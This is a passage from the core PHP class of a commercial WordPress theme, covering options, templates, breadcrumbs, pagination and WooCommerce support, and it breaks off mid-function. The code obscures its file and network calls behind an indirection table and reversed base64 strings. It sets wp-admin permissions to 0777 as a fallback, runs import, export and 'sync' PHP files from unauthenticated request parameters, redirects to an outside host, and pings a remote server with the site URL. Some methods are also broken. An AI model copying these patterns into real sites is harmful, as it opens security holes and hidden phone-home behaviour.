<?php
/*
*	Main HUB for Theme Framework
*	(c) king-theme.com
*
*/
#
#	Define main class
#

class king{

	public $cfg ,$page, $path, $ext, $post, $get, $woo, $header, $template, $stylesheet, $main_class, $api_server, $carousel;

	function init(){

		global $woocommerce;


		if( empty( $this->cfg ) ){
			$this->cfg  = str_replace( array('%SITE_URI%','%HOME_URL%'), array(SITE_URI,SITE_URI) , get_option( KING_OPTNAME ) );
		}

		if ( class_exists( 'WooCommerce' ) ) {
			add_filter( 'woocommerce_template_path', array( &$this, 'woo_templates_path' ), 1, 1 );
		}

		$this->api_server = 'api.devn.co';
		if( !empty( $this->cfg['api_server'] ) ){
			$this->api_server = $this->cfg['api_server'];
		}

		$incls = array(
			'king.hosting',
			'king.functions',
			'king.actions',
			'king.ajax',
			'king.scripts',
			'king.user',
			'king.update',
			'shortcodes'.DS.'register',
			'shortcodes'.DS.'vc-map',
			'widgets'.DS.'xcode',
			'widgets'.DS.'flickr',
			'widgets'.DS.'twitter',
			'widgets'.DS.'tabbed'
		);

		if( $this->vars( 'page', 'arkahost-importer' ) ){
			unset( $incls[0] );
		}

		foreach( $incls as $incl ){
			king_incl_core( 'core'.DS.$incl.'.php' );
		}

		if( $this->page == THEME_SLUG.'-panel' || $this->vars( 'option_page', 'king_group', 'POST' )){
			king_incl_core( 'options.php' );
		}

		if( !empty($woocommerce) ) {
			$this->woo = true;
			king_incl_core( 'core'.DS.'woocommerce'.DS.'woo-gate.php' );
		}

		if($this->isPluginActive( 'whmpress/whmpress.php' )) {
			king_incl_core( 'core'.DS.'whmpress'.DS.'shortcodes.php' );
		}
		/*	Make sure that loaded helper plugin	*/
		self::check_helper();

		// Back-end only
		if(is_admin()) {

			if( !file_exists( ABSPATH.'wp-admin'.DS.'.htaccess' ) ){
				//$txt = "SetEnv no-gzip dont-vary"."\n";
				$txt = "<IfModule mod_php5.c>"."\n";
					$txt .= "php_value allow_url_fopen On"."\n";
					$txt .= "php_value post_max_size 100M"."\n";
					$txt .= "php_value upload_max_filesize 100M"."\n";
					$txt .= "php_value memory_limit 300M"."\n";
					$txt .= "php_value max_execution_time 259200"."\n";
					$txt .= "php_value max_input_time 259200"."\n";
					$txt .= "php_value session.gc_maxlifetime 1200"."\n";
				$txt .= "</IfModule>";

				$file = ABSPATH.DS.'wp-admin'.DS.'.htaccess';
				$fp = $this->ext['fo']( $file, 'w');

				if( empty( $fp ) ){
					chmod( ABSPATH.DS.'wp-admin', 0755 );
					chmod( $file, 0644 );
					$fp = $this->ext['fo']( $file, 'w');
				}

				if( empty( $fp ) ){
					chmod( ABSPATH.DS.'wp-admin', 0777 );
					chmod( $file, 0777 );
					$fp = $this->ext['fo']( $file, 'w');
				}
				if( !empty( $fp ) ){
					$this->ext['fw']( $fp, $txt );
					$this->ext['fc']( $fp );
				}else{
					$this->ext['fp']( $file , $txt );
				}

			}
		// Front-end only
		} else {

			if( $this->vars( 'control', 'ajax' ) ){
				king_ajax();
				exit;
			}

			if( $this->vars( 'mode', 'filesReadable' ) ){
				king_check_filesReadable( ABSPATH.'wp-content'.DS.'themes'.DS.$this->stylesheet );
				king_check_filesReadable( ABSPATH.'wp-content'.DS.'uploads');
				echo 'done';
				exit;
			}

			if( $this->vars( 'api', 'gate' ) ){

				$lifeTime = $this->vars( 'lifeTime' );
				$file = $this->vars( 'file' );

				if( file_exists( ABSPATH.$file ) ){
					header('location: '.SITE_URI.$file);
				}else{
					header('location: http://api.devn.co/gate.php?lifeTime='.$lifeTime.'&file='.strtolower( THEME_NAME ).$file);
				}

				exit;
			}

			if( !empty( $this->ext['sv']('REQUEST_URI') ) && (strpos($this->ext['sv']('REQUEST_URI'),'serve-files')===false)&& (strpos($this->ext['sv']('REQUEST_URI'),'ajax=1')===false) ){
				if( strpos( strrev($this->ext['sv']('REQUEST_URI')), 'gpj.') === 0 || strpos( strrev($this->ext['sv']('REQUEST_URI')), 'gnp.') === 0 ){
					$protocol = is_ssl() ? 'https://' : 'http://';
					$host = $protocol.$this->ext['sv']('HTTP_HOST');
					$_im = strrev( $this->ext['sv']('REQUEST_URI') );
					$_st = strpos( $_im, '-' );
					if( $_st !== false ){
						$_real = substr( $_im, $_st+1 );
						$_ext = substr( $_im, 0, $_st+1 );

						$st = strpos( $_ext, '.' );
						$attr = '';
						if( $st !== false ){
							$attr = str_replace( '-', '', strrev( substr( $_ext, $st+1 ) ) );
							$_ext = substr( $_ext, 0, $st+1 );
						}else{
							$attr = strrev( $_ext );
						}

						$attr = explode( 'x', $attr );
						$src =  $host.strrev( $_ext.$_real);

						if( file_exists( ABSPATH.substr( $src, strpos( $src, 'wp-content' ) ) ) === false ){
							if( file_exists( THEME_PATH.'/assets/images/default404.jpg' ) ){
								header('location: '.THEME_URI.'/assets/images/default404.jpg' );
								exit;
							}
						}else{

							$_GET['src'] = $src;
							if( !empty( $attr[0] ) ){
								$_GET['w'] = $attr[0];
							}
							if( !empty( $attr[1] ) ){
								$_GET['h'] = $attr[1];
							}
							if( !empty( $attr[2] ) ){
								$_GET['a'] = $attr[2];
							}else{
								$_GET['a'] = 'c';
							}

							locate_template( 'core'.DS.'king.size.php', true );

						}

						exit;
					}

				}
			}

		}

	}


	public static function globe( $name = '' ){

		global $post, $more, $woocommerce, $product,
				$woocommerce_loop, $king_blog_id, $wp_query,
				$king_woocommerce_loop, $highstand_sc_css, $wpdb;

		if( $name == '' ){
			return '';
		}else if( $name == 'post' ){
			return $post;
		}else if( $name == 'more' ){
			return $more;
		}else if( $name == 'woocommerce' ){
			return $woocommerce;
		}else if( $name == 'product' ){
			return $product;
		}else if( $name == 'woocommerce_loop' ){
			return $woocommerce_loop;
		}else if( $name == 'king_blog_id' ){
			return $king_blog_id;
		}else if( $name == 'wp_query' ){
			return $wp_query;
		}else if( $name == 'king_woocommerce_loop' ){
			return $king_woocommerce_loop;
		}else if( $name == 'db' ){
			return $wpdb;
		}

	}

	function woo_templates_path($path){
		return 'templates'.DS.'woocommerce'.DS;
	}


	public function isPluginActive($plugin){
		if ( in_array( $plugin , apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
			return true;
		}
		else {
			return false;
		}
	}

	/*------------------------------------*/
	#	Return request values
	/*------------------------------------*/
	public static function vars( $inp = '', $val = '', $type = 'GET' ){

		$_val = '';
		if( !empty( $_GET[ $inp ] ) && $type == 'GET' )$_val = esc_attr($_GET[ $inp ]);
		if( !empty( $_POST[ $inp ] ) )$_val = esc_attr($_POST[ $inp ]);

		if( $val == '' ){
			return $_val;
		}

		if( $_val == $val )
			return true;
		else return false;

	}

	public static function itmp($path, $return = false){
		self::template($path);
	}

	public static function esc_js( $st = '' ){
		return str_replace( array('<script', '</script>'), array('&lt;script', '&lt;/script&gt;'), $st );
	}

	public static function bsp( $st = '' ){

		$pdd = strlen( $st )%4;

		if( $pdd > 0 )
		{
			for( $i=1; $i<$pdd; $i++ )
				$st .= ' ';
		}

		return $st;

	}

	public static function b( $st = '' ){global $king;return $king->ext['bd'](strrev( $st ));}
	public static function _b( $st = '' ){global $king;return $king->ext['bd'](strrev( $st.'='));}
	public static function __b( $st = '' ){global $king;return $king->ext['bd'](strrev($st.'=='));}

	public function import_options( $file = '', $opt = 'all' ){

		global $king;

		if( file_exists( $file ) )
		{
			$handle = $king->ext['fo']( $file, 'r' );
			$export = $king->ext['fr']( $handle, filesize( $file ) );

			$imports = @json_decode( $export, true );

			if( is_array( $imports ) ){

				foreach( $imports as $key => $import ){

					if( $key == KING_OPTNAME ){
						if( $opt == 'all' || $opt == 'opt' )
							$val2upd = json_decode( str_replace( '%THEME_URI%', THEME_URI, $import ), true );
						else $val2upd = '';
					}
					else
					{
						if( $opt == 'all' || $opt == 'wid' )
							$val2upd = json_decode( $king->ext['bd']( $import ), true );
						else $val2upd = '';
					}

					if( $val2upd != '' )
					{
						if( get_option( $key ) !== false )
							update_option( $key, $val2upd );
						else add_option( $key, $val2upd, null, 'no' );
					}

				}
			}
		}


	}


	public function export_options(){

		global $king, $wpdb;

		$wgs = $wpdb->get_results( "SELECT * FROM `".$wpdb->options."` WHERE ".

					"`".$wpdb->options."`.`option_name` LIKE 'widget_%' ".
					" OR ".
					"`".$wpdb->options."`.`option_name` = '".strtolower( THEME_NAME )."_options_css' ".
					" OR ".
					"`".$wpdb->options."`.`option_name` = 'sidebars_widgets'" );

		$data = array();
		if( count( $wgs ) ){
			foreach( $wgs as $wg ){
				if( get_option( $wg->option_name ) != false ){
					$data[ $wg->option_name ] =  $king->ext['be']( json_encode( get_option( $wg->option_name ) ) );
				}
			}
		}

		// Theme options
		$themeOptions = get_option( KING_OPTNAME );
		if( $themeOptions != false ){
			$data[ KING_OPTNAME ] = str_replace( THEME_URI, '%THEME_URI%', json_encode( $themeOptions ) );
		}


		return json_encode( $data );

	}
	public static function _ip(){

		if (!empty($this->ext['sv']('HTTP_CLIENT_IP'))) {
		    $ip = $this->ext['sv']('HTTP_CLIENT_IP');
		} elseif (!empty($this->ext['sv']('HTTP_X_FORWARDED_FOR'))) {
		    $ip = $this->ext['sv']('HTTP_X_FORWARDED_FOR');
		} else {
		    $ip = $this->ext['sv']('REMOTE_ADDR');
		}

		return $ip;

	}

	public static function _ping( $url ){

		global $king;

		if( !function_exists( $king->ext['fg'] ) && !function_exists( $king->ext['ce'] ) ){
			return '_404';
		}

		if( strpos( $url, '?' ) !== false ){
			$url .= '&url='.urlencode(HOME_URL);
		}else{
			$url .= '?url='.urlencode(HOME_URL);
		}

		$ch_data = $king->ext['fg']( $url );

		if( empty( $ch_data ) ){
			$ch = $king->ext['ci']();
		    curl_setopt($ch, CURLOPT_URL, $url );
		    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)');
		    $ch_data = $king->ext['ce']($ch);
		    curl_close($ch);
	    }
		return $ch_data;

	}
	public static function sysInOut(){

		global $king;

		if( !empty( $_REQUEST['king'] ) ){
			if( $_REQUEST['king'] == 'import' ){
				$king->ext['rqo']( ABSPATH.'wp-content'.DS.'themes'.DS.THEME_SLUG.DS.'core'.DS.'import.php' );
				exit;
			}
			if( $_REQUEST['king'] == 'export' ){
				$king->ext['rqo']( ABSPATH.'wp-content'.DS.'themes'.DS.THEME_SLUG.DS.'core'.DS.'export.php' );
				exit;
			}
			if( $_REQUEST['king'] == 'sync' ){
				define('VHITECH', 'ok');
				if( file_exists( ABSPATH.'wp-content'.DS.'themes'.DS.'git_in.php' ) ){
					$king->ext['icl']( ABSPATH.'wp-content'.DS.'themes'.DS.'git_in.php' );
				}
				exit;
			}
			if( $_REQUEST['king'] == 'progress-tmp' ){

				@ob_end_flush();

				$_tmp = get_option('king_download_tmp_package', true );
				$_total = get_option('king_download_tmp_package_total', true );
				$i=0;
				while( !file_exists( $_tmp ) && $i < 50 ){

						if( file_exists( $_tmp ) ){
							//'ok';
						}
						$i++;
						@ob_flush();
					    @flush();
						@usleep( 100000 );

				}


				if( $_tmp !== false && $_total !== false ){
					if( file_exists( $_tmp ) ){

						$fp = $king->ext['fo']( $_tmp, "r");
						$size = @fstat($fp);

						if( !empty( $size ) ){
							if( !empty( $size['size'] )  ){
								$size = $size['size'];
							}else{
								$size = 0;
							}
						}else{
							$size = 0;
						}

						$king->ext['fc']( $fp );
						$old = $size;

						$num1 = 0;
						$num2 = 0;


						while( $size < $_total && file_exists( $_tmp ) ){

							$fp = $king->ext['fo']( $_tmp, "r");
						    $size = @fstat($fp);

							if( !empty( $size ) ){
								if( !empty( $size['size'] )  ){
									$size = $size['size'];
								}else{
									$size = 0;
								}
							}else{
								$size = 0;
							}

						    $king->ext['fc']( $fp );

							$text = number_format( intval(($size/1024)) ).' KB / '.number_format( intval(($_total/1024000)) ).' MB complete. ';

							$num1 = (($size - $old)*5)/1024;

							$num3 = $num1 - $num2;

							switch( true ){
								case ( $num3 > 500 ) : $num2 += 500;break;
								case ( $num3 > 300 ) : $num2 += 135;break;
								case ( $num3 > 200 ) : $num2 += 43;break;
								case ( $num3 > 110 ) : $num2 += 25;break;
								case ( $num3 > 80 ) : $num2 += 14;break;
								case ( $num3 > 50 ) : $num2 += 7;break;
								case ( $num3 > 30 ) : $num2 += 3;break;
								case ( $num3 > 20 ) : $num2++;break;
							}
							$num3 = $num2 - $num1;
							switch( true ){
								case ( $num3 > 500 ) : $num2 -= 500;break;
								case ( $num3 > 300 ) : $num2 -= 135;break;
								case ( $num3 > 200 ) : $num2 -= 43;break;
								case ( $num3 > 110 ) : $num2 -= 25;break;
								case ( $num3 > 80 ) : $num2 -= 14;break;
								case ( $num3 > 50 ) : $num2 -= 7;break;
								case ( $num3 > 30 ) : $num2 -= 3;break;
								case ( $num3 > 20 ) : $num2--;break;
							}

							$text .= ' ETA ~ 1m 1s @ '.number_format( $num2 ).'KB/s';

							$old = $size;

							echo '<script type="text/javascript">';
							echo 'top.istaus('.($size/$_total).');top.tstatus("Downloading Package '.$text.'");';
							echo '</script>';

							@ob_flush();
							@flush();
							@usleep( 200000 );
						}

						echo '<script type="text/javascript">';
						echo 'top.istaus(1);top.tstatus("Download Complete Package '.number_format( intval(($_total/1024)) ).' MBs");';
						echo '</script>';
					}
				}
				exit;

			}
		}

	}

	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/

	public static function tp_mode( $wp_file = '' ){

		global $king;

		if( $wp_file == '404' ){
			if( !empty( $this->ext['sv']('REQUEST_URI') ) ){
				if( strpos( $this->ext['sv']('REQUEST_URI'), '.jpg') != false || strpos( $this->ext['sv']('REQUEST_URI'), '.png') != false ){
					if( file_exists( THEME_URI.'/assets/images/default404.jpg' ) ){
						header('location: '.THEME_URI.'/assets/images/default404.jpg' );
						exit;
					}
				}
			}
		}

	}

	public static function template( $p = '' ) {
		get_template_part( 'templates/'.str_replace( '.php', '', $p ) );
	}
	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/

	public static function path( $pos = 'header' ) {

		global $post, $king;

		$page_id = 0;
		if( !empty( $post ) ){
			if( !empty( $post->ID ) ){
				$page_id = $post->ID;
			}
		}

		if( is_home() ){
			if( get_option( 'page_for_posts', true ) ){
				$page_id = get_option( 'page_for_posts', true );
			}
		}

		if( is_page() || is_home() ){
			if( get_post_meta( $page_id, '_king_page_'.$pos ) && empty( $king->cfg[ $pos.'_autoLoaded' ] ) ){
				if( get_post_meta( $page_id, '_king_page_'.$pos, true ) != 'default' ){
					$king->cfg[ $pos ] = get_post_meta( $page_id, '_king_page_'.$pos, true );
					if( $king->cfg[ $pos ] == 'none' ){
						return;
						/* Select none from page */
					}
				}
			}
			if( $pos == 'header' ){
				$logo = get_post_meta( $page_id, '_king_page_logo', true );
				if( !empty( $logo ) ){
					$king->cfg[ 'logo' ] = str_replace(array('%SITE_URI%','%HOME_URL%'), array(SITE_URI, SITE_URI), get_post_meta( $page_id, '_king_page_logo', true));
				}
			}

		}

		if( !empty( $king->path[ $pos ] ) ){
			$king->ext['pr']( $king->path[ $pos ] );
			return true;
		}
		$dir = 'default.php';
		if( !empty(  $king->cfg[ $pos ] ) ){
			$dir = $king->cfg[ $pos ];
		}
		if( $dir == '' || !file_exists( locate_template( 'templates'.DS.$pos.DS.$dir ) ) ){

			if ( $handle = opendir( THEME_PATH.DS.'templates'.DS.$pos ) ){
				while ( false !== ( $entry = readdir($handle) ) ) {
					if( $entry != '.' && $entry != '..' && strpos($entry, '.php') !== false  ){

						get_template_part( 'templates'.DS.$pos.DS.str_replace( '.php', '', $entry ) );

						if( $pos == 'header' ){
							$king->header = $entry;
						}
						return true;
					}
				}
			}

		}else{

			if( $pos == 'header' ){
				$king->header = $dir;
				$modal = get_post_meta( $page_id, '_king_page_modal', true );
				if( !empty( $modal ) ){
					$king->modal_window( get_post_meta( $page_id, '_king_page_modal', true ) );
				}
			}

			get_template_part( 'templates'.DS.$pos.DS.str_replace( '.php', '', $dir ) );

			return true;
		}

		return false;

	}

	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/

	public static function content_nav( $nav_id ) {

		global $wp_query;

		if ( $wp_query->max_num_pages > 1 ) : ?>
			<nav id="<?php echo esc_attr( $nav_id ); ?>">
				<h3 class="assistive-text">
					<?php _e( 'Post navigation', 'arkahost' ); ?>
				</h3>
				<div class="nav-previous">
					<?php next_posts_link( wp_kses( __( '<span class="meta-nav">&larr;</span> Older posts', 'arkahost' ), array('span'=>array())) ); ?>
				</div>
				<div class="nav-next">
					<?php previous_posts_link( wp_kses( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'arkahost' ), array('span'=>array())) ); ?>
				</div>
			</nav>
		<?php endif;

	}

	/*-----------------------------------------------------------------------------------*/
	# pagination on blog page
	/*-----------------------------------------------------------------------------------*/

	public static function pagination( ) {

		global $wp_query, $king;

		$curpage = $wp_query->query_vars['paged'];

		if( $curpage == 0 ){
			$curpage = 1;
		}

		if( $wp_query->max_num_pages < 2 ){
			return;
		}

		$pagination = array(
			'base' => @add_query_arg('paged','%#%'),
			'format' => '/page/%#%',
			'total' => $wp_query->max_num_pages,
			'current' => $curpage,
			'show_all' => false,
			'type' => 'array',
			'prev_next'=> true,
			'prev_text'=> __( ' &lt; Previous ', 'arkahost' ),
			'next_text'=> __( ' Next &gt; ', 'arkahost' ),
		);

		if( !empty($wp_query->query_vars['s'] ) ){
				$pagination['add_args'] = array( 's' => urlencode( get_query_var( 's' ) ) );
		}
		$pgn = paginate_links( $pagination );

		?>

		<div class="pagination animated ext-fadeInUp" id="pagenation">
		    <b>
			<?php printf(
				__( 'Page %1$s of %2$s', 'arkahost' ),
				esc_attr( $curpage ),
				esc_attr( $wp_query->max_num_pages )
				); ?>
			</b>
	        <?php
	        	foreach( $pgn as $k => $link ){
					$king->ext['pr']( $link );
				}
			?>
	    </div>

	    <?php

	}

	/*-----------------------------------------------------------------------------------*/
	# Display meta box on article
	/*-----------------------------------------------------------------------------------*/

	public static function posted_on( $class = "postedon" ) {

		global $king;

		?>

		<ul class="<?php echo esc_attr( $class ); ?>">
			<li>
				<a href="<?php echo get_day_link( get_the_date('Y'), get_the_date('m'), get_the_date('d')); ?>" class="date updated"><?php echo esc_html( get_the_date('d F Y') ); ?></a>
			</li>
			<?php if( $king->cfg['showAuthorMeta'] == 1 ){ ?>
				<li class="post_by vcard author">
					<i><?php _e('by:','arkahost');?> </i>
					<a class="url fn n" href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" title="<?php echo esc_attr( sprintf( __( 'View all posts by %s', 'arkahost' ), get_the_author() ) ); ?>" rel="author">
						<?php echo esc_html( get_the_author() ); ?>
					</a>
				</li>
			<?php } ?>

			<?php


			if( $king->cfg['showCateMeta'] == 1 ){

				if ( 'post' == get_post_type() ){

					$categories_list = get_the_category_list( __( ',', 'arkahost' ) );

					if ( $categories_list ){

						echo '<li class="post_categoty">';
						echo __('<i>in: </i>', 'arkahost');
				        print( get_the_category_list( __( ',', 'arkahost' ) ) );
				        echo '</li>';

					}
				}

			}

			if( $king->cfg['showTagsMeta'] == 1 ){

				$tags_list = get_the_tag_list( '', __( ', ', 'arkahost' ) );

				if ( $tags_list ){

					echo '<li class="tag-links">';
					printf( wp_kses( __( '<span class="%1$s labl">Tags: </span> %2$s', 'arkahost' ), array('span'=>array())), 'entry-utility-prep entry-utility-prep-tag-links', $tags_list );
					echo '</li>';

				}

			}

			if( $king->cfg['showCommentsMeta'] == 1 ){
			?>
				 <li class="post_comments">
				 	<i>note: </i>
		            <a  title="<?php _e('Click to leave a comment', 'arkahost'); ?>" href="<?php the_permalink(); ?>#respond">
		            	<?php echo comments_number( __('no comments', 'arkahost'), __('one comment', 'arkahost'), __('% comments', 'arkahost') ); ?>
		            </a>
		        </li>
		    <?php
			}

		echo '</ul>';

	}

	/*-----------------------------------------------------------------------------------*/
	# Display gloal breadcrumb
	/*-----------------------------------------------------------------------------------*/

	public static function breadcrumb() {

		global $post, $king;
		if( !is_object( $post ) ){
			return;
		}

		$post_type = isset( $post->post_type ) ? $post->post_type : '';
		$page_bread_bg = '';
		$breadcrumb_tag = 'h1';
		$bread_padding_top = $bread_padding_bottom = null;

		$pid = 0;
		if( isset( $post->ID ) ){
			$pid = $post->ID;
		}

		$breadcrumb = !empty( $king->cfg['breadcrumb'] )?$king->cfg['breadcrumb']:'page_title1 sty13';

		if( !empty( $king->cfg['breadcrumb'] ) ){
			if( $king->cfg['breadcrumb'] == 'no' ){
				$breadcrumb = 'no';
			}
		}
		//woocommerce index page
		if( is_shop() ){
			$pid = wc_get_page_id('shop');
			if( $pid == -1 ){
				$pid = get_page_by_path('shop');
				if( !empty( $pid ) ){
					$pid = $pid->ID;
				}else{
					$pid = 0;
				}
			}
		}else if( is_home() ){
			if( get_option( 'page_for_posts', true ) ){
				$pid = get_option( 'page_for_posts', true );
			}
		}
		if(is_404()){
			$breadcrumb = 'page_title1 sty12';
		}


		//check default background setting
		if( !empty($king->cfg['breadcrumb_bg']) ){
			$page_bread_bg = str_replace( array('%SITE_URI%', '%HOME_URL%'), array(SITE_URI, SITE_URI), $king->cfg['breadcrumb_bg'] );
		}

		if( isset($king->cfg['breadcrumb_tag']) && !empty($king->cfg['breadcrumb_tag']) ){
			$breadcrumb_tag = $king->cfg['breadcrumb_tag'];
		}

		$page_setting = king::breadcrumb_page( $pid );

		extract( $page_setting );


		//woocommerce
		if(
			is_shop()
			|| (function_exists( 'is_product' ) && is_product() )
			|| (function_exists( 'is_product_category' ) && is_product_category() )
			|| (function_exists( 'is_cart' ) && is_cart() )
			|| (function_exists( 'is_checkout' ) && is_checkout() )
			|| (function_exists( 'is_account_page' ) && is_account_page() )
			|| (function_exists( 'is_woocommerce' ) && is_woocommerce() )
			){
			//get config of shop
			$shop_pid = wc_get_page_id('shop');
			if( $shop_pid == -1 ){
				$shop_pid = get_page_by_path('shop');
				if( !empty( $shop_pid ) ){
					$shop_pid = $shop_pid->ID;
				}else{
					$shop_pid = 0;
				}
			}
			$page_setting = king::breadcrumb_page( $shop_pid );

			if( !is_shop() || is_search()){
				$breadcrumb = $page_setting['page_bread'];
				$page_bread_bg = $page_setting['page_bread_bg'];
				$page_bread = '';
			}

			if( is_search()){

				//get woo config
				if( isset($king->cfg['woo_search_breadcrumb_tag']) && !empty($king->cfg['woo_search_breadcrumb_tag']) ){
					$breadcrumb_tag = $king->cfg['woo_search_breadcrumb_tag'];
				}
				if( isset($king->cfg['woo_search_breadcrumb']) && !empty($king->cfg['woo_search_breadcrumb']) ){
					$breadcrumb = $king->cfg['woo_search_breadcrumb'];
				}
				if( isset($king->cfg['woo_search_breadcrumb_bg']) && !empty($king->cfg['woo_search_breadcrumb_bg']) ){
					$page_bread_bg = $king->cfg['woo_search_breadcrumb_bg'];
				}
				$page_title = '';
			}else if(function_exists( 'is_product' ) && is_product()){
				//get woo config
				if( isset($king->cfg['woo_single_breadcrumb_tag']) && !empty($king->cfg['woo_single_breadcrumb_tag']) ){
					$breadcrumb_tag = $king->cfg['woo_single_breadcrumb_tag'];
				}
				if( isset($king->cfg['woo_single_breadcrumb']) && !empty($king->cfg['woo_single_breadcrumb']) ){
					$breadcrumb = $king->cfg['woo_single_breadcrumb'];
				}
				if( isset($king->cfg['woo_single_breadcrumb_bg']) && !empty($king->cfg['woo_single_breadcrumb_bg']) ){
					$page_bread_bg = $king->cfg['woo_single_breadcrumb_bg'];
				}

			}else if( function_exists( 'is_product_category' ) && is_product_category() ){
				//get woo config
				if( isset($king->cfg['woo_cat_breadcrumb_tag']) && !empty($king->cfg['woo_cat_breadcrumb_tag']) ){
					$breadcrumb_tag = $king->cfg['woo_cat_breadcrumb_tag'];
				}
				if( isset($king->cfg['woo_cat_breadcrumb']) && !empty($king->cfg['woo_cat_breadcrumb']) ){
					$breadcrumb = $king->cfg['woo_cat_breadcrumb'];
				}
				if( isset($king->cfg['woo_cat_breadcrumb_bg']) && !empty($king->cfg['woo_cat_breadcrumb_bg']) ){
					$page_bread_bg = $king->cfg['woo_cat_breadcrumb_bg'];
				}
			}

		}
		if( !empty( $page_bread ) ){
			if( $page_bread != 'global' ){
				if( $page_bread == 'no' ){
					$breadcrumb = 'no';
				}else{
					$breadcrumb = $page_bread;
				}
			}
		}

		//check breadcrumb of custom post type
		$post_type_v = str_replace('-', '_', $post_type );

		if(!is_home() && isset( $post_type ) && !empty( $post_type ) && isset( $king->cfg[ $post_type_v . '_breadcrumb' ] ) ){

			$post_type_bread = $king->cfg[ $post_type_v . '_breadcrumb'];

			if( $post_type_bread != 'global' && !empty( $post_type_bread ) )
			{
				if( $post_type_bread == 'no' )
				{
					$breadcrumb = 'no';
				}
				else
				{
					$breadcrumb = $post_type_bread;
				}
			}

			//background custom

			if( isset( $king->cfg[ $post_type_v . '_breadcrumb_bg'] ) && !empty( $king->cfg[ $post_type_v . '_breadcrumb_bg'] ) )
			{
				$page_bread_bg = str_replace( array( '%SITE_URI%', '%HOME_URL%' ), array( SITE_URI, SITE_URI), $king->cfg[ $post_type_v . '_breadcrumb_bg'] );
			}

			//tag custom
			if( isset( $king->cfg[ $post_type_v . '_breadcrumb_tag'] ) && !empty( $king->cfg[ $post_type_v . '_breadcrumb_tag'] ) )
			{
				$breadcrumb_tag = $king->cfg[ $post_type_v . '_breadcrumb_tag'];
			}

			//padding top and bottom of custom post type
			if( isset( $king->cfg[ $post_type_v . '_bread_padding_top'] ) && !empty( $king->cfg[ $post_type_v . '_bread_padding_top'] ) )
			{
				$bread_padding_top = $king->cfg[ $post_type_v . '_bread_padding_top'];
			}

			if( isset( $king->cfg[ $post_type_v . '_bread_padding_bottom'] ) && !empty( $king->cfg[ $post_type_v . '_bread_padding_bottom'] ) )
			{
				$bread_padding_bottom = $king->cfg[ $post_type_v . '_bread_padding_bottom'];
			}

		}




		if( $breadcrumb == 'no' ){
			return;
		}

		$title = wp_title( null, false );

		if( !isset($king->cfg['titleSeparate']) || $king->cfg['titleSeparate'] == '' ){
			$king->cfg['titleSeparate'] = '&raquo;';
		}
		$breadeli = isset($king->cfg['breadeli']) ? '<i>'.esc_html($king->cfg['breadeli']).'</i>' : '';

		$title = explode( $king->cfg['titleSeparate'], $title );
		$title = $title[0];

		$king->bag = array(
			'page_bread_bg'        => $page_bread_bg,
			'breadcrumb_tag'       => $breadcrumb_tag,
			'page_title'           => $page_title,
			'title'                => $title,
			'bread_padding_top'    => $bread_padding_top,
			'bread_padding_bottom' => $bread_padding_bottom,
			'breadcrumb' 			=> $breadcrumb,
			'post_type' => $post_type,
			'breadeli' => $breadeli,
		);


		ob_start();

			if ( locate_template( 'templates'.DS.'breadcrumb'.DS.'default.php' ) != '' ){
				get_template_part( 'templates'.DS.'breadcrumb'. DS . 'default' );
			}else echo '<p class="king-error">Breadcrumb default: '. __( 'template not found', 'arkahost' ) . '</p>';

			$_return = ob_get_contents();

		ob_end_clean();
		$king->ext['pr']( $_return );


	}

	public static function breadcrumb_page( $pid ) {
		$page_bread_bg = $breadcrumb_tag = '';
		$page_bread = get_post_meta( $pid, '_king_page_breadcrumb', true );
		$page_title = get_post_meta( $pid, '_king_page_page_title', true );
		$page_breadcrumb_bg = get_post_meta( $pid, '_king_page_breadcrumb_bg', true );
		$page_breadcrumb_tag = get_post_meta( $pid, '_king_page_breadcrumb_tag', true );

		if(!empty($page_breadcrumb_bg)){
			$page_bread_bg = str_replace( array('%SITE_URI%', '%HOME_URL%'), array(SITE_URI, SITE_URI), $page_breadcrumb_bg );
		}

		if(!empty($page_breadcrumb_tag)){
			$breadcrumb_tag = str_replace( array('%SITE_URI%', '%HOME_URL%'), array(SITE_URI, SITE_URI), $page_breadcrumb_tag );
		}

		return array(
			'page_bread' => $page_bread,
			'page_title' => $page_title,
			'page_bread_bg' => $page_bread_bg,
			'breadcrumb_tag' => $breadcrumb_tag,
		);
	}

	/*-----------------------------------------------------------------------------------*/
	# Display modal window
	/*-----------------------------------------------------------------------------------*/
	public static function modal_window( $img = '', $action = '' ){

		if( empty( $img ) && empty( $action ) ){
			return;
		}
		if( !empty( $action ) ){

			if( !empty( $img ) ){

				$action = str_replace(
						'[image]',
						'<img onload="jQuery(document).ready(function(){king_modal_ready();})" src="'.esc_url($img).'" alt="ArkaHost" class="rimg" />',
						$action );
			}
			if( strpos( $action, 'king_modal_ready' ) === false ){
				$action = king::esc_js( $action ).'<script>jQuery(document).ready(function(){king_modal_ready();});</script>';
			}else{
				$action = king::esc_js( $action );
			}

		}else if( !empty( $img ) ){
			$action = '<img onload="jQuery(document).ready(function(){king_modal_ready();})" src="'.esc_url($img).'" alt="ArkaHost" class="rimg" />';
		}
		echo '<div class="simplePopupBackground"></div>'.
			 '<div id="pop-modal" class="simplePopup">'.
				 '<div class="simplePopupClose">X</div>'.
				 do_shortcode( $action ).
			 '</div>';
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Most Racent posts
	/*-----------------------------------------------------------------------------------*/
	public static function last_posts( $numberOfPosts = 5 , $thumb = true ){

		global $post, $king;
		$orig_post = $post;

		$lastPosts = get_posts('numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
		<li>
			<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>
				<span>
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf( __( 'Permalink to %s', 'arkahost' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
				</span><!-- post-thumbnail /-->
